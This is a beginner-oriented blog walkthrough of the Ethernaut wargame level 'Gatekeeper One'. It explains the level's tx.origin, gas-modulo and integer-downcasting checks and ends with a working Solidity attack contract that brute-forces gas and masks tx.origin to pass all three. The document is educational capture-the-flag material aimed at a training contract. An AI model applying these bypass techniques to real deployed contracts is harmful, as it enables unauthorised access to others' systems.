---
title: "Ethernaut - Walkthrough for Noobs - 13 - Gatekeeper One"
datePublished: Tue Mar 28 2023 22:34:00 GMT+0000 (Coordinated Universal Time)
cuid: clfsu4nwr000e09mg5k3ofps9
slug: ethernaut-walkthrough-for-noobs-13-gatekeeper-one
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1680028896426/73e97479-5e8c-4887-8f5f-25f58c186b05.jpeg
tags: ethereum, web3, smart-contracts, 2articles1week, ethernaut

---

I will explain the challenge in a slightly different way this time, usually, we start with some background information, look at the code, and then write a solution.

This challenge is different as there are three mini-challenges mixed in, so we will have to tackle them one by one.

> There are three gates, and we have to pass the gates to clear the level.
> 
> Objective: Make it past the gatekeeper and register as an entrant to pass this level.

### Gate 1

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

We have looked at the concept of `tx.origin` in a previous challenge [Telephone](https://adityabajaj.hashnode.dev/ethernaut-walkthrough-for-noobs-4-telephone). Refer to that challenge to understand the concept behind `tx.origin`.

Basically, to pass this modifier, we must create an intermediary contract and that contract should interact with the GatekeeperOne contract.

Hence, The intermediary contract == `msg.sender` and our address == `tx.origin`. Thus, passing the condition.

### Gate 2

```solidity
  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }
```

`gasleft()` is an in-built function and as its name suggests, tells us the remaining gas left after the contract call.

The modifier here means that the gas left should yield a remainder 0 when divided by 8191, that is the gas left should be a multiple of 8191. To solve this we must send the exact amount of gas "required to execute all the contract code + enough that it's divisible by 8191"

There are two ways to solve the issue, the barbarian way would be to translate all the solidity code in EVM opcodes, and calculate the gas which further depends on the compiler version you are using, etc. It's safe to say that we are not using this method.

The second, more smarter way would be to brute-force the function, incrementing gas using a loop until we hit the sweet spot.

### Gate 3

```solidity
modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```

To pass this gate, we need to understand type conversions, downcasting, upcasting, and bitmasking.

1. Upcasting: When we convert a smaller data type into a larger data type. There is no data loss and the extra space is padded with 0s. Integers are padded on the left whereas fixed-size byte types are padded on right. [Refer this](https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types)
    
    ```solidity
    uint16 a = 0x1234;
    uint32 b = uint32(a); // b will be 0x00001234 now
    ```
    
    ```solidity
    bytes2 a = 0x1234;
    bytes4 b = bytes4(a); // b will be 0x12340000
    ```
    
2. Downcasting: When we convert a bigger datatype into a smaller datatype. This is problematic since we will have data loss. In integers, higher-order bits will get cut and in fixed-sized bytes types lower order will get cut.
    
    ```solidity
    uint32 a = 0x12345678;
    uint16 b = uint16(a); // b will be 0x5678 now
    ```
    
    ```solidity
    bytes2 a = 0x1234;
    bytes1 b = bytes1(a); // b will be 0x12
    ```
    
3. Bitmasking: This is the act of applying a "mask" to a value. Basically using some bitwise operators like `AND` `OR` or `XOR` to mask or choose which subset you would want and which you want to clear.
    
    We will be using the `AND` operator in this challenge. [Read more](https://www.geeksforgeeks.org/bitwise-operators-in-c-cpp/)
    
    *Note: Bitwise Operators should not be confused with Logical Operators.*
    

Since we got the background down, let's look at Gate 3, and see how we can pass that. The `gateThree` modifier takes an 8-byte input. Let's assume that to be `0x A1 A2 A3 A4 A5 A6 A7 A8`

*Note:* `uintX` *or the number after* `uint` *i.e. X is in bits and not bytes, so divide that by 8 for understanding.*

1. ```solidity
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
    //this condition states that 
    //0x A5 A6 A7 A8 == 0x 00 00 A7 A8 
    
    //which basically means that A5 A6 must be zeroes. 
    ```
    
2. ```solidity
    require(uint32(uint64(_gateKey)) != uint64(_gateKey)) 
    //this condition states that 
    
    //0x 00 00 00 00 A5 A6 A7 A8 != 0x A1 A2 A3 A4 A5 A6 A7 A8
    
    //which basically means that, A1 A2 A3 A4 cannot be zeroes. 
    ```
    
3. ```solidity
    require(uint32(uint64(_gateKey)) == uint16(tx.origin))
    //this condition states that 
    
    //0x A5 A6 A7 A8 == 0x 00 00 (bytes from tx.origin)
    
    //which basically means that A7 and A8 must be the last two bytes of tx.origin.
    ```
    

All of this summarized means this: `0x NZ NZ NZ NZ 00 00 TX TX`, where

1. `NZ == any non-zero data`
    
2. `TX = tx.origin data`
    

since we only need to make sure that A5 and A6 are zeroes, we can add an `AND` bitwise operator on `tx.origin` to generate the required key.

```solidity
bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF

//adding bytes8 to convert it to required format. 
//using the & bitwise operator as a mask, A5 and A6 in tx.origin will turn to zero and rest everything else will remain the same. 
```

We are pretty much done with the explanation, let's check the solution.

### Solution

```solidity
//SPDX-License-Identifier: MIT
pragma solidity 0.8.18; 

contract TheMasterKey{
//gate 1 is automatically passed, since we are using another contract to interact with Gatekeeper One. 
    function attack(address _GateKeeper) external { //function that takes the Gatekeeper Contract Address
        bytes8 gatekey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF); //to bypass gate3. 

        for(uint256 i=0; i<300; i++) { //creates a for loop
            uint256 totalGas = i + (8191 * 4); //total gas == gas spent + gas required for gate 2. 
            (bool result, ) = _GateKeeper.call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)", gatekey)); //low level call, using .enter will cause it to revert. 
            
            if (result) { //stops the loop when we succeed. 
                break;
            }
        }
    }
}
```

1. Open up your Remix IDE and Compile and Deploy this.
    
2. Add your level instance as `_Gatekeeper`
    
3. Check if the `entrant` is you
    

Submit Instance⛩️